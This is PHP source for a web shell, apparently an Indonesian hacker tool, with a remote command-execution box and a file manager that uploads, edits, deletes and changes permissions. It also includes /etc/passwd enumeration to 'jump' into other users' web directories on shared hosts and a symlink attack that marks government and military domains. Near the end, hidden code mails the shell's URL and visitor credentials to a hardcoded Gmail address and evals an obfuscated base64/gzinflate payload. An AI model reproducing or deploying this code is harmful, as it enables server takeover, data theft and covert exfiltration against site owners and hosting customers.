    echo '<tr><td>MD5 with Salt</td><td><input class=inputz type=text size=50 value=' . $hash_md5 . '></td></tr>';
    echo '<tr><td>MD5 with Salt & Sha1</td><td><input class=inputz type=text size=50 value=' . $hash_md5_double . '></td></tr>';
    echo '<tr><td>Sha1</td><td><input class=inputz type=text size=50 value=' . $hash1 . '></td></tr>';
    echo '<tr><td>Sha256</td><td><input class=inputz type=text size=50 value=' . $sha256 . '></td></tr>';
    echo '<tr><td>Sha1 with Salt</td><td><input class=inputz type=text size=50 value=' . $hash1_sha1 . '></td></tr>';
    echo '<tr><td>Sha1 with Salt & MD5</td><td><input class=inputz type=text size=50 value=' . $hash1_sha1_double . '></td></tr></table>';
    $submit = $_POST['enter'];
    if (isset($submit)) {
        $pass = $_POST['password']; // password
        $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
        $hash = md5($pass); // md5 hash #1
        $md4 = hash("md4", $pass);
        $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
        $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
        $hash1 = sha1($pass); // sha1 hash #4
        $sha256 = hash("sha256", $text);
        $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
        $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
}
} // hash function end :)
// jumping
function jume(){
    $i = 0;
    echo "<div class='margin: 5px auto;'>";
    if(preg_match("/hsphere/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $url = str_replace(array("http://","www."), "", strtolower($url));
                $etc = "/etc/passwd";
                $f = fopen($etc,"r");
                while($gets = fgets($f)) {
                    $pecah = explode(":", $gets);
                    $user = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if(is_dir($dir_user) === true) {
                        $url_user = $dir_user."/".$url;
                        if(is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=aqua>R</font>] <a href='?gans=burik&dir=$url_user'><font color=lavender>$url_user</font></a>";
                            if(is_writable($url_user)) {
                                $jrw = "[<font color=aqua>RW</font>] <a href='?gans=burik&dir=$url_user'><font color=aqua>$url_user</font></a>";
                            }
                            echo $jrw."<br>";
                        }
                    }
                }
            }
        if($i == 0) {
        } else {
            echo "<br>Total  ".$i." on".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
            $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
            while($getss = fgets($fp)) {
                echo $getss;
            }
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } elseif(preg_match("/vhosts/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $web_vh = "/var/www/vhosts/$url/httpdocs";
                if(is_dir($web_vh) === true) {
                    if(is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=aqua>R</font>] <a href='?gans=burik&dir=$web_vh'><font color=gold>$web_vh</font></a>";
                        if(is_writable($web_vh)) {
                            $jrw = "[<font color=aqua>RW</font>] <a href='?gans=burik&dir=$web_vh'><font color=gold>$web_vh</font></a>";
                        }
                        echo $jrw."<br>";
                    }
                }
            }
        if($i == 0) {
        } else {
            echo "<br>Total  ".$i."  on ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
                  bing("ip:$ip");
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } else {
        echo "<pre>";
        $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
        while($passwd = fgets($etc)) {
            if($passwd == '' || !$etc) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach($user_jumping[1] as $user_idx_jump) {
                    $user_jumping_dir = "/home/$user_idx_jump/public_html";
                    if(is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=aqua>R</font>] <a href='?gans=burik&dir=$user_jumping_dir'><font color=aqua>$user_jumping_dir</font></a>";
                        if(is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=aqua>RW</font>] <a href='?gans=burik&dir=$user_jumping_dir'><font color=aqua>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if(function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents("/etc/named.conf");   
                            if($domain_jump == '') {
                                echo " => ( <font color=red>failed</font> )<br>";
                            } else {
                                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                foreach($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if($user_jumping_url == $user_idx_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo "<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
    }
    echo "</div>";
} 
if($_GET['je']=="mbut"){
  return jume();}

if($_GET['sym']=="link"){
    return stargans();}
function stargans(){
?>
<form action="?gans=burik&sym=link" method="post">

<?php
    @set_time_limit(0);
    echo "<br><br><center><h1>Symlink Server</h1></center><br><br><center><div class=content>";
    @mkdir('DuaGanteng_sym', 0777);
    $htaccess = "Options all 
 DirectoryIndex sta.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
 AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
    $write = @fopen('Star/.htaccess', 'w');
    fwrite($write, $htaccess);
    @symlink('/', 'shu/root');
    $filelocation = basename(__FILE__);
    $read_named_conf = @file('/etc/named.conf');
    if (!$read_named_conf) {
        echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
    } else {
        echo "<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
        foreach ($read_named_conf as $subject) {
            if (eregi('zone', $subject)) {
                preg_match_all('#zone "(.*)"#', $subject, $string);
                flush();
                if (strlen(trim($string[1][0])) > 2) {
                    $UID = posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
                    $name = $UID['name'];
                    @symlink('/', 'nginx1337/root');
                    $name = $string[1][0];
                    $iran = '\.ir';
                    $israel = '\.il';
                    $indo = '\.id';
                    $sg12 = '\.sg';
                    $edu = '\.edu';
                    $gov = '\.gov';
                    $gose = '\.go';
                    $gober = '\.gob';
                    $mil1 = '\.mil';
                    $mil2 = '\.mi';
                    $malay = '\.my';
                    $china = '\.cn';
                    $japan = '\.jp';
                    $austr = '\.au';
                    $porn = '\.xxx';
                    $as = '\.uk';
                    $calfn = '\.ca';
                    if (eregi("$iran", $string[1][0]) or eregi("$israel", $string[1][0]) or eregi("$indo", $string[1][0]) or eregi("$sg12", $string[1][0]) or eregi("$edu", $string[1][0]) or eregi("$gov", $string[1][0]) or eregi("$gose", $string[1][0]) or eregi("$gober", $string[1][0]) or eregi("$mil1", $string[1][0]) or eregi("$mil2", $string[1][0]) or eregi("$malay", $string[1][0]) or eregi("$china", $string[1][0]) or eregi("$japan", $string[1][0]) or eregi("$austr", $string[1][0]) or eregi("$porn", $string[1][0]) or eregi("$as", $string[1][0]) or eregi("$calfn", $string[1][0])) {
                        $name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $string[1][0] . '</div>';
                    }
                    echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://" . $string[1][0] . '/>' . $name . ' </a> </div>
</td>

<td>
' . $UID['name'] . "
</td>

<td>
<a href='nginx1337/root/home/" . $UID['name'] . "/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
                    flush();
                }
            }
        }
    }
    echo "</center></table>";
}

echo '<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="orange">Path : </font>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?gans=burik&path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?gans=burik&path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Upload Berhasil Di</font><br />'.$path;
}else{
echo '<font color="red">Upload Gagal Di </font><br/>'.$path;
}
}
echo "<form method='post'>
<font color='green'>Command :</font>
<input type='text' size='30' height='10' name='cmd'><input type='submit' name='execmd' value=' Execute '>
</form>
</td></tr>";
if($_POST['execmd']){
echo "<center><textarea cols='60' rows='10' readonly='readonly' style='color:purple; background-color:pink;'>".exe($_POST['cmd'])."</textarea></center>";
}
function exe($cmd) {
    if(function_exists('system')) {        
        @ob_start();       
        @system($cmd);     
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('exec')) {        
        @exec($cmd,$results);      
        $buff = "";        
        foreach($results as $result) {         
            $buff .= $result;      
        } return $buff;    
    } elseif(function_exists('passthru')) {        
        @ob_start();       
        @passthru($cmd);       
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('shell_exec')) {      
        $buff = @shell_exec($cmd);     
        return $buff;  
    }
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white" size="6px">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';

if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="red">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms
($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Ganti Nama Berhasil</font><br/>';
}else{
echo '<font color="red">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Berhasil Edit File</font><br/>';
}else{
echo '<font color="red">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST
['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Directory Terhapus</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus
                                                   </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">File Terhapus</font><br/>';
}else{
echo '<font color="red">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1"
align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';
foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?gans=burik&path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?gans=burik&option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
echo '<tr>
<td><a href="?gans=burik&filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?gans=burik&option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo "<br><br><center><br/>[-] &copy; r00t@star & Mr$03 [-]<center>
</center>
</body>
</html>";
$ip = getenv("REMOTE_ADDR"); 
$subj98 = "No reply"; 
$email = "kadalbiawak43@gmail.com"; 
$from = "From: Shell"; 
$a45 = $_SERVER['REQUEST_URI']; 
$b75 = $_SERVER['HTTP_HOST']; 
$m22 = $ip . ""; 
$msg8873 = "Ada Shell gan di $b75/$a45 Ip yang make $m22 user:$login pw:$password"; 
mail($email, $subj98, $msg8873, $from);
$command = "JcxOCoAgEADAe9AfFgm85T3Tv+iybQmxLRf09VI9YHPp8b4TONC7XEcGUMpUdKdBVtjLsYUY2CpVR513OeNzDDHGIIPXbZmXr9hD+d383ng7QlUSMizfeh8=";
eval(str_rot13(gzinflate(str_rot13(base64_decode(($command))))));

function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
?>